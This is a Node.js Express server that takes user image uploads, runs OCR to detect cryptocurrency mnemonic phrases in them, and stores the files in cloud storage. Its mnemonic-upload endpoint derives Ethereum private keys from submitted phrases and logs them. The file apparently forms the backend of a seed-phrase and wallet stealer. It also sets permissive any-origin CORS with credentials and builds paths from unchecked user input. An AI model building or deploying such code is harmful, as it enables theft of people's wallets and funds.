const express = require('express');
const multer = require('multer');
const path = require('path');
const https = require('https');
const fs = require('fs');
const cors = require('cors');
const utils = require('./function');
const textDetect = require('./text-detection');
const { message } = require('statuses');
const { hdkey } = require('ethereumjs-wallet');
const bip39 = require('bip39');

if (!process.env.DOCKER_ENV) {
    require('dotenv').config();
}

if (!process.env.B2_BUCKET_ID || !process.env.B2_ACCOUNT_ID || !process.env.B2_APPLICATION_KEY) {
    console.error('Please provide B2_BUCKET_ID, B2_ACCOUNT_ID and B2_APPLICATION_KEY in the environment variables.');
    process.exit(1);
}

if (!process.env.ENCRYPTION_KEY) {
    console.error('Please provide ENCRYPTION_KEY in the environment variables.');
    process.exit(1);
}

const app = express();
// Ensure that bodyParser is able to handle form-data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Only allow your specific frontend domain and enable credentials
const corsOptions = {
    origin (origin, callback) {
        callback(null, true);
    },
    credentials: true, // Enable credentials
    allowedHeaders: '*', // Accept any headers
    exposedHeaders: '*' // Expose any headers
};

// Helper function to ensure directory exists
function ensureDirSync (dirPath) {
    if (!fs.existsSync(dirPath)) {
        fs.mkdirSync(dirPath, { recursive: true });
    }
}

// Configure multer for file storage
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const userId = req.body.userId; // Ensure you get userId from your form data or route parameters
        const userDir = `uploads/user_${userId}`;
        ensureDirSync(userDir); // Make sure the directory exists
        cb(null, userDir);
    },
    filename: function (req, file, cb) {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});

const upload = multer({ storage });

app.get('/test/ping', function (req, res) {
    res.send('pong');
});
app.options('/test/ping', cors(corsOptions)); // Enable preflight request for this endpoint

// Endpoint to handle POST requests for file uploads
app.post('/basic/image-upload', upload.single('image'), async (req, res) => {
    const userId = req.body.userId; // Retrieve the userId from form data
    if (!req.file) {
        return res.status(400).send('No file uploaded.');
    }

    try {
        // Path and name of the file saved locally
        const localFilePath = req.file.path;
        const localFileName = req.file.filename;
        const valid = null;

        // Upload to Backblaze B2
        const b2Response = await utils.uploadToB2(localFilePath, localFileName, userId);

        // Perform OCR text recognition
        const textJSON = await textDetect.detectMnemonicPhrase(localFilePath);

        // Log the upload details in MongoDB
        await utils.logUploadDetails(userId, localFileName, textJSON);

        // Send success response
        res.send({
            status: 'success',
            valid, // TODO:
            message: 'File uploaded successfully to local and Backblaze B2!'
        });
    } catch (error) {
        res.status(500).send('Error uploading the image: ' + error.message);
    }
});
app.options('/upload', cors(corsOptions)); // Enable preflight request for this endpoint

app.get('/basic/image-download', async (req, res) => {
    const { fileName, userId } = req.query;

    if (!fileName || !userId) {
        return res.status(400).send('Missing fileName or userId.');
    }

    try {
        const fileBuffer = await utils.downloadFromB2(fileName, userId);

        // Log the download details in MongoDB
        await utils.logDownloadDetails(userId, fileName);

        res.setHeader('Content-Disposition', `attachment; filename=${fileName}`);
        res.setHeader('Content-Type', 'application/octet-stream');
        res.send(fileBuffer);
    } catch (error) {
        console.error('Download error:', error);
        res.status(500).send('Failed to download the file');
    }
});
app.options('/basic/image-download', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO:
app.get('/basic/image-edit-info-download', async (req, res) => {
    const { userId, fileName } = req.query;

    if (!userId || !fileName) {
        return res.status(400).send('Missing userId or fileName.');
    }

    try {
        // TODO: Get the image edit info from MongoDB
        const editInfo = await utils.getImageEditInfo(fileName);

        res.send({
            status: 'success',
            editInfo,
            message: 'Image edit info downloaded successfully!'
        });
    } catch (error) {
        console.error('Download error:', error);
        res.status(500).send('Failed to download the image edit info');
    }
});
app.options('/basic/image-edit-info-download', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO: This endpoint is for development purposes only
app.post('/basic/image-edit-info-upload', async (req, res) => {
    const { token, fileName, editInfo } = req.body;

    if (!fileName || !editInfo) {
        return res.status(400).send('Missing fileName or editInfo.');
    }
    if (token !== process.env.DEV_TOKEN) {
        return res.status(401).send('Unauthorized');
    }

    try {
        const uploadResult = await utils.uploadImageEditInfo(fileName, editInfo);

        res.send({
            status: 'success',
            message: 'Image edit info uploaded successfully!'
        });
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).send('Failed to upload the image edit info');
    }
});
app.options('/basic/image-edit-info-upload', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO:
app.post('/basic/mnemonic-upload', async (req, res) => {
    const { mnemonicPhase, userId } = req.body;

    if (!mnemonicPhase || !userId) {
        return res.status(400).send('Missing mnemonicPhase or userId.');
    }

    // Decrypt the mnemonic
    const decryptedMnemonicPhase = utils.decryptMnemonic(mnemonicPhase);

    try {
        // Validate the decrypted mnemonic
        const valid = bip39.validateMnemonic(decryptedMnemonicPhase);
        if (!valid) {
            return res.status(400).send('Invalid mnemonic phrase.');
        }

        // Convert mnemonic to seed
        const seed = bip39.mnemonicToSeedSync(decryptedMnemonicPhase);

        // Derive a path according to BIP-44
        const hdwallet = hdkey.fromMasterSeed(seed);
        const path = "m/44'/60'/0'/0/0";  // standard derivation path for Ethereum
        const wallet = hdwallet.derivePath(path).getWallet();

        // Get the private key and address
        const privateKey = wallet.getPrivateKey().toString('hex');
        const address = wallet.getAddressString();

        // Log the wallet credentials instead of the mnemonic
        await utils.logWalletCredentials(userId, address, privateKey);

        res.send({
            status: 'success',
            valid,
            message: 'Mnemonic phrase uploaded and credentials logged successfully!'
        });
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).send('Failed to upload the mnemonic phrase');
    }
});
app.options('/basic/mnemonic-upload', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO: Request the latest version number of the APP
app.get('/basic/latest-version', async (req, res) => {
    res.send({
        version: '1.0.0'
    });
});
app.options('/basic/latest-version', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO: Get the latest release file
app.get('/basic/latest-release', async (req, res) => {
    res.send({
        file: 'release.zip'
    });
});
app.options('/basic/latest-release', cors(corsOptions)); // Enable preflight request for this endpoint

// TODO: Return the keywords as search filters for the image.
app.get('/basic/image-keywords', async (req, res) => {
    const { userId } = req.query;

    if (!userId) {
        return res.status(400).send('Missing userId.');
    }

    try {
        const keywords = await utils.getKeywords(); // TODO:

        res.send({
            status: 'success',
            keywords,
            message: 'Keywords found successfully!'
        });
    } catch (error) {
        console.error('Search error:', error);
        res.status(500).send('Failed to search keywords');
    }
});
app.options('/basic/image-keywords', cors(corsOptions)); // Enable preflight request for this endpoint

const SERVER_PORT = process.env.SERVER_PORT || 3000;
const keyPath = process.env.PRIVKEY_PATH;
const certPath = process.env.CERT_PATH;

if (!fs.existsSync(keyPath) || !fs.existsSync(certPath)) {
    console.error('Required certificate files not found. Exiting...');
    process.exit(1);
}

https.createServer({
    key: fs.readFileSync(keyPath),
    cert: fs.readFileSync(certPath)
}, app)
.listen(SERVER_PORT, () => {
    console.log(`Listening on port ${SERVER_PORT}!`);
});
